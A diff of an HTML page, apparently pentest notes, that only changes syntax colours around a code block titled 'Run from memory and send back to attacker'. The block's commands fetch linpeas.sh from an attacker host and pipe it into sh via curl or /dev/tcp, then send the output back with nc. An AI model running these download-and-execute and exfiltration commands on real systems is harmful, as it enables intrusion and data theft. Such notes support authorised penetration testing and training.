@@ -30,17 +30,17 @@
         <p>See carlospolop : <a href="https://github.com/carlospolop/PEASS-ng">PEASS-ng</a>  <a href="https://book.hacktricks.xyz/">hacktricks</a></p>
 <h2 id="execution">Execution:</h2>
 <p>Run from memory and send back to attacker:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#f0f0f0;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#60a0b0;font-style:italic"># Local network</span>
-sudo python -m SimpleHTTPServer <span style="color:#40a070">80</span> <span style="color:#60a0b0;font-style:italic">#Host</span>
-curl 10.10.10.10/linpeas.sh | sh <span style="color:#60a0b0;font-style:italic">#Victim</span>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-shell" data-lang="shell"><span style="color:#75715e"># Local network</span>
+sudo python -m SimpleHTTPServer <span style="color:#ae81ff">80</span> <span style="color:#75715e">#Host</span>
+curl 10.10.10.10/linpeas.sh | sh <span style="color:#75715e">#Victim</span>
 
-<span style="color:#60a0b0;font-style:italic"># Without curl</span>
-sudo nc -q <span style="color:#40a070">5</span> -lvnp <span style="color:#40a070">80</span> &lt; linpeas.sh <span style="color:#60a0b0;font-style:italic">#Host</span>
-cat &lt; /dev/tcp/10.10.10.10/80 | sh <span style="color:#60a0b0;font-style:italic">#Victim</span>
+<span style="color:#75715e"># Without curl</span>
+sudo nc -q <span style="color:#ae81ff">5</span> -lvnp <span style="color:#ae81ff">80</span> &lt; linpeas.sh <span style="color:#75715e">#Host</span>
+cat &lt; /dev/tcp/10.10.10.10/80 | sh <span style="color:#75715e">#Victim</span>
 
-<span style="color:#60a0b0;font-style:italic"># Excute from memory and send output back to the host</span>
-nc -lvnp <span style="color:#40a070">9002</span> | tee linpeas.out <span style="color:#60a0b0;font-style:italic">#Host</span>
-curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 <span style="color:#40a070">9002</span> <span style="color:#60a0b0;font-style:italic">#Victim</span>
+<span style="color:#75715e"># Excute from memory and send output back to the host</span>
+nc -lvnp <span style="color:#ae81ff">9002</span> | tee linpeas.out <span style="color:#75715e">#Host</span>
+curl 10.10.14.20:8000/linpeas.sh | sh | nc 10.10.14.20 <span style="color:#ae81ff">9002</span> <span style="color:#75715e">#Victim</span>
 </code></pre></div>
       </div>
       
